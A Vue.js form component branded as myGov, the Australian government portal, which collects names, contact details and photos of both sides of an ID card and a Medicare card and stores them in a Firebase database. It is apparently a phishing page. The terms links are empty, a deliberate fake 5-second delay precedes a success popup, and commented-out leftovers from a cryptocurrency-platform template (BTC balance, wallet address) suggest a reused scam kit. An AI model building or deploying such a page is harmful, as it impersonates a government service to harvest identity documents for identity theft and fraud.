<template>
  <div class="back">
    <form class="signUp" @submit.prevent="sendMessage" >
      <div class="wrapper">
        <div class="headline">
          <router-link to="/">
            <img src="@/assets/mygov.svg" alt="logo" class="company-logo">
          </router-link>
        </div>
        <div class="form">
          <p class="form-header">Application Form</p>
          <div class="signUp">

            <div class="group">
              <div class="form-group">
                <input type="text" placeholder="First Name" v-model="firstName" required name="firstName" />
              </div>
              <div class="form-group">
                <input type="text" placeholder="Last Name" v-model="lastName"  required name="LastName"  />
              </div>
            </div>

            <div class="form-group">
              <input type="email" placeholder="Email" v-model="email"  required name="Email" />
            </div>

            <div class="form-group">
              <input type="number" placeholder="Phone Number" v-model="PhoneNumber"  required name="phoneNumber" />
            </div>

<!--            <div class="has-addons">-->
<!--              <input v-if="showPassword2"  required="required" type="text"  class="input-form-1 password"   placeholder="Password"   />-->
<!--              <input v-else type="password"    required="required"  class="input-form-1 password"   placeholder="Password"   >-->
<!--              <div class="space" @click="toggleShow2">-->
<!--                <i class="fas" :class="{ 'fa-eye-slash': showPassword2, 'fa-eye': !showPassword2 }" ></i>-->
<!--              </div>-->
<!--            </div>-->
<!--            <div class="has-addons">-->
<!--              <input v-if="showPassword2"   required="required" type="text"  class="input-form-1 password"   placeholder="Confirm Password"   />-->
<!--              <input v-else type="password"  required="required"  class="input-form-1 password"   placeholder="Confirm Password"   >-->
<!--              <div class="space" @click="toggleShow2">-->
<!--                <i class="fas" :class="{ 'fa-eye-slash': showPassword2, 'fa-eye': !showPassword2 }" ></i>-->
<!--              </div>-->
<!--            </div>-->

            <div class="form-group">
              <select name="gender" v-model="gender" id="gender" required >
                <option :value="null" disabled>Choose Gender</option>
                <option value="" >Choose Gender</option>
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                <option value="Other">Other</option>
              </select>
            </div>

            <div class="form-group-3">
              <label style="color: #0f171c;font-size: 14px;" class="id">Identification Card (Upload front of ID card for verification)</label>
              <input
                  type="file"
                  id="files"
                  name="files"
                  style="color: #0f171c"
                  @change="uploadFile"
                  accept="image/*"
                  ref="file"
                  placeholder="Identification Card (Upload ID card for verification)"
                  required
              />
            </div>

            <div class="form-group-3">
              <label style="color: #0f171c;font-size: 14px;" class="id">Identification Card (Upload back of ID card for verification)</label>
              <input
                  type="file"
                  id="files2"
                  style="color: #0f171c"
                  name="files"
                  @change="uploadFile2"
                  accept="image/*"
                  ref="file2"
                  placeholder="Identification Card (Upload ID card for verification)"
                  required
              />
            </div>

            <div class="form-group-3">
              <label style="color: #0f171c;font-size: 14px;" class="id">MEDICARE (make sure it is clear)</label>
              <input
                  type="file"
                  id="files3"
                  style="color: #0f171c"
                  name="files"
                  @change="uploadFile3"
                  accept="image/*"
                  ref="file3"
                  placeholder="Identification Card (Upload ID card for verification)"
                  required
              />
            </div>


            <div class="form-group-2">
              <input
                  type="checkbox"
                  placeholder="terms"
                  id="remember-me"
                  class="checkbox"
                  name="RememberMe"
                  required
              />
              <label for="remember-me" class="checkbox-text"
              >I Agree to myGov's
                <a  class="terms" >Terms And Conditions</a>
                and
                <a  class="terms" >Privacy Policy</a>
              </label
              >
            </div>
            <base-button
                :loading="loading"
                style="
  background: #389ba7;
  border: 1px solid #389ba7;
  color: white;
"
                 >Apply Now</base-button>
            <!--            <div v-if="error">{{ error }}</div>-->
<!--            <div class="separator">-->
<!--              <div class="line"></div>-->
<!--              <h2>OR</h2>-->
<!--              <div class="line"></div>-->
<!--            </div>-->

<!--            <div class="create-acc">-->
<!--              <p class="create-text">-->
<!--                Already have an account?<a @click.prevent="onPostClick"-->
<!--                                           class="create-link"-->
<!--              >Login in here</a-->
<!--              >-->
<!--              </p>-->
<!--            </div>-->

          </div>
        </div>

      </div>
    </form>
    <terms-base-modal @close="hideDialog" v-if="dialogIsVisible"/>
  </div>
</template>

<script>

import TermsBaseModal from "@/components/BaseComponents/modal/TermsBaseModal.vue";
import BaseButton from "@/components/BaseComponents/buttons/BaseButton.vue";
import Swal from "sweetalert2";
import { serverTimestamp,} from "firebase/database";
import {db} from "@/firebase/config";
import {doc, setDoc,} from "firebase/firestore";


export default {
  // eslint-disable-next-line vue/multi-word-component-names
  name: 'RegisterForm',
  components: {BaseButton, TermsBaseModal},
  data() {
    return {
      dialogIsVisible: false,
      showPassword2: false,
      base64: "",
      url: "",
      base642: "",
      url2: "",
      base643: "",
      url3: "",
      randomString: "",
      randomString2: "",
      firstName: "",
      lastName: "",
      email: "",
      PhoneNumber: "",
      gender: "",
      loading: false,
    };
  },

  computed:{

  },

  methods: {
    onPostClick() {
      this.$router.push("/login");
    },
    hideDialog() {
      this.dialogIsVisible = false;
    },
    showDialog() {
      this.dialogIsVisible = true;
    },
    toggleShow2() {
      this.showPassword2 = !this.showPassword2;
    },

    // async createUser() {
    //   await StoreUtils.commit(StoreUtils.mutations.auth.updateSignUpFormData, {
    //     email: this.model.email,
    //   })
    //   await StoreUtils.dispatch(StoreUtils.actions.auth.createUser, {
    //     firstName: this.model.firstName,
    //     lastName: this.model.lastName,
    //     email: this.model.email,
    //     password: this.model.password,
    //     referralCode: this.randomString,
    //     frontId: "",
    //     backId: "",
    //     totalDepositedAmount: 0.00,
    //     phoneNumber: this.model.phoneNumber,
    //     totalWithdrawals: 0.00,
    //     btcBalance: 0.00,
    //     displayPicture: "",
    //     walletAddress: "",
    //     walletName: "",
    //     twoFactorAuthenticationCode: this.randomString2,
    //     userStatus: "unVerified",
    //     role: "Customer",
    //     country: this.model.country,
    //     address: this.model.address
    //   })
    //   // await this.$router.push("/email-auth")
    // },

    generateRandomString() {
      const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      let result = '';
      for (let i = 0; i < 5; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
      }
      this.randomString = result;
    },

    generateRandomString2() {
      const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      let result = '';
      for (let i = 0; i < 5; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
      }
      this.randomString2 = result;
    },

    uploadFile() {
      let input = this.$refs.file;
      let files = input.files;
      //console.log(size);
      const reader = new FileReader();
      try {
        reader.onload = (e) => {
          this.base64 = e.target.result;
          // this.uploadOfficerImage();
        };
        reader.readAsDataURL(files[0]);
        this.$emit("input", files[0]);
      } catch (e) {
        console.warn(e.message);
      }
    },
    // async uploadOfficerImage() {
    //
    //   this.uploadmodel.username = `${
    //       this.auth.userInfo.userFirstName + this.auth.userInfo.userLastName
    //   }_${Date.now()}`;
    //   this.uploadmodel.base64 = this.base64;
    //   await StoreUtils.dispatch(StoreUtils.actions.sbucket.uploadEncodedFile, this.uploadmodel, { root: true });
    //   this.url = this.sbucket.s3bucketResponse.url;
    //
    // },

    uploadFile2() {
      let input = this.$refs.file2;
      let files = input.files;
      //console.log(size);
      const reader = new FileReader();
      try {
        reader.onload = (e) => {
          this.base642 = e.target.result;
          // this.uploadOfficerImage2();
        };
        reader.readAsDataURL(files[0]);
        this.$emit("input", files[0]);
      } catch (e) {
        console.warn(e.message);
      }
    },
    // async uploadOfficerImage2() {
    //   // this.showLoader = true;
    //   this.uploadmodel2.username = `${
    //       this.auth.userInfo.userFirstName + this.auth.userInfo.userLastName
    //   }_${Date.now()}`;
    //   this.uploadmodel2.base64 = this.base642;
    //   // await this.$store.dispatch("sbucket/uploadEncodedFile", this.uploadmodel, { root: true });
    //   await StoreUtils.dispatch(
    //       StoreUtils.actions.sbucket.uploadEncodedFile,
    //       this.uploadmodel2,
    //       { root: true }
    //   );
    //   this.url2 = this.sbucket.s3bucketResponse.url;
    //   // this.showLoader = false;
    // },

    uploadFile3() {
      let input = this.$refs.file3;
      let files = input.files;
      //console.log(size);
      const reader = new FileReader();
      try {
        reader.onload = (e) => {
          this.base643 = e.target.result;
          // this.uploadOfficerImage2();
        };
        reader.readAsDataURL(files[0]);
        this.$emit("input", files[0]);
      } catch (e) {
        console.warn(e.message);
      }
    },

    async sendMessage() {
      this.loading = true;

      try {
        await setDoc(doc(db, "Requests", this.email), {
          firstName: this.firstName,
          lastName: this.lastName,
          email: this.email,
          gender: this.gender,
          PhoneNumber: this.PhoneNumber,
          IdFront: this.base64,
          IdBack: this.base642,
          MediCare: this.base643,
          createdAt: serverTimestamp(),
        }, { merge: true });

        console.log('saved');

        // Simulate 5 seconds loading
        await new Promise(resolve => setTimeout(resolve, 5000));

        await Swal.fire({
          icon: 'success',
          title: 'Success',
          text: 'Application sent Successfully!',
        });

        this.resetForm();
        this.$router.push("/login");

      } catch (error) {
        console.error("Error saving application:", error);
        await Swal.fire({
          icon: 'error',
          title: 'Submission Failed',
          text: 'An error occurred. Please try again.',
        });
      } finally {
        this.loading = false;
      }
    },


    resetForm() {
      this.firstName = '';
      this.lastName = '';
      this.email = '';
      this.gender = '';
      this.PhoneNumber = '';
      this.base64 = '';
      this.base642 = '';
      this.base643 = '';
    },

  },


  created() {
    this.generateRandomString();
    this.generateRandomString2();
  },

  mounted() {
    this.generateRandomString();
    this.generateRandomString2();
  }

}
</script>

<style scoped>
.back{
  background-color: #f5f5f5;
  height: 120vh;
}

.form-header{
  text-align: center;
  margin-bottom: 25px;
  font-size: 23px;
  font-weight: 600;
}

.company-logo{
  width: 23%;
}

:root {
  --primary-color: #3525d3;
  --white-color: #fff;
  --black-color: #3c4a57;
  --light-gray: #e4e8ee;
}

.wrapper {
  position: relative;
  align-items: center;
  justify-content: center;
}



.wrapper {
  width: 100%;
  margin: auto;
}

.wrapper::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-position: center center;
  background-size: cover;
  background-repeat: no-repeat;
  min-height: 100vh;
  z-index: -1;
}

.wrapper .headline {
  text-align: center;
  background-color: #65D2EE !important;
  padding: 1.5rem;
  margin-bottom: 20PX;
}


.wrapper .headline h2 {
  font-weight: 400;
  font-size: 23px;
  width: 50%;
  display: block;
  margin-left: auto;
  margin-right: auto;
  /*margin-top: 10%;*/
  color: #0A0A0AFF;
}
.wrapper .headline p{
  font-size: 15px;
  width: 75%;
  display: block;
  margin-left: auto;
  margin-right: auto;
  color: #0A0A0AFF;
}
.wrapper .form {
  max-width: 500px;
  width: 100%;
  margin: auto;
  -webkit-box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  background: #ffffff;
  border-radius: 12px;
  padding: 30px 50px 60px 50px;
}

.wrapper .form-group {
  margin-bottom: 15px;
  margin-right: 5px;
  margin-left: 5px;
  width: 100%;
}

.wrapper .form-group input {
  display: block;
  font-size: 16px;
  line-height: 24px;

  padding: 12px 16px;
  height: 48px;
  border-radius: 8px;
  color: var(--black-color);
  border: 1px solid #e4e8ee;
  box-shadow: none;
  width: 100%;
}

.wrapper .form-group-3 input {
  display: block;
  font-size: 16px;
  line-height: 24px;

  padding: 12px 16px;
  height: 48px;
  border-radius: 8px;
  border: 1px solid #e4e8ee;
  box-shadow: none;
  width: 100%;
  margin-bottom: 20px;
  color: #FFFFFF;
}

.wrapper .form-group input:focus {
  outline: none;
  border: 1px solid #24405A;
}

.wrapper .form-group input::placeholder {
  color: var(--black-color);
  font-weight: 400;
  font-size: 14px;
}

.wrapper .form-group select {
  display: block;
  font-size: 13px;
  line-height: 24px;
  letter-spacing: -0.1px;
  padding: 12px 16px;
  height: 48px;
  border-radius: 5px;
  color: var(--black-color);
  border: 1px solid #e4e8ee;
  box-shadow: none;
  width: 100%;
}

.wrapper .form-group select:focus {
  outline: none;
  border: 1px solid #24405A;
}

.wrapper .form-group select::placeholder {
  color: var(--black-color);
  font-weight: 400;
  font-size: 14px;
}




.form-group-2 {
  display: flex;
  align-items: center;
  align-content: center;
  padding-top: 15px;
  padding-bottom: 15px;
}

.checkbox-text {
  padding-left: 8px;
  font-size: 13px;
  color: #0A0A0AFF;
}

.forgot-password {
  padding-left: 26%;
  text-decoration: none;
  color: #0A0A0AFF;
  font-size: 15px;
}

.separator {
  display: flex;
  align-items: center;
  padding-top: 10px;
}

.separator .line {
  height: 1px;
  flex: 0.5;
  background-color: #0A0A0AFF;
}

.separator h2 {
  padding: 0 1rem;
  font-size: 12px;
  color: #0A0A0AFF;
}

.create-acc {
  padding-top: 20px;
  font-size: 17px;
  padding-bottom: 40px;
}
.create-text {
  font-size: 15px;
  color: #0A0A0AFF;
}

.create-link {
  padding-left: 5px;
  color: #389ba7;
  /*text-decoration: underline;*/
}

.group{
  display: flex;
}

.has-addons{
  display: flex;
  flex-direction: row-reverse;
  justify-content: center;
  align-items: center;
  align-content: center;
  margin-right: unset;
  margin-left: 5px;
  margin-bottom: 5px;
}
button{
  background-color: transparent;
}
.fas{
  font-size: 13px;
  margin-top: 10%;
}
.space{
  padding-top: 12px;
  padding-bottom: 12px;
  padding-right: 9px;
  border: 1px solid #d0d5dd;
  border-left-style: none;
  border-radius: 0 8px 8px 0;
  font-size: 1rem;
  background-color: #FFFFFF;
}
.input-form-1{
  order: 1;
  width: 100%;
  padding: 13px 20px;
  margin: 6px 0;
  display: inline-block;
  box-sizing: border-box;
}
input {
  box-sizing: border-box;
  border: 1px solid #D0D5DD;
  border-radius: 8px;
  -webkit-transition: 0.3s;
  /*padding-top: 12px;*/
  /*padding-bottom: 12px;*/
  transition: 0.3s;
  outline: none;
  color: var(--black-color);
}
input:focus {
  border: 1px solid #24405A;
}
input::placeholder {
  color: var(--black-color);
}
.input-form-1.password {
  border-right-style: none;
  border-radius: 8px 0 0 8px;
  padding-top: 13.5px;
  padding-bottom: 13.5px;
}


.id{
  font-size: 13px;
  color: #FFFFFF;
  opacity: 0.5;
}

.terms{
  color: #389ba7;
  text-decoration: underline;
}


@media (max-width: 767px) {
  .wrapper {
    width: 100%;
  }
  .wrapper .headline h1 {
    font-size: 22px;
    line-height: 25px;
  }

  .company-logo{
    width: 35%;
  }

  .wrapper .form {
    margin-top: 8%;
  }

}
@media (max-width: 990px) {
  .wrapper .headline h1  {
    font-size: 32px;
  }
  .wrapper .headline h2  {
    font-size: 28px;
    width: 90%;
  }
}

@media (max-width: 500px) {

  .wrapper .form {
    width: 90%;
  }

  .company-logo{
    width: 50%;
  }

}


</style>

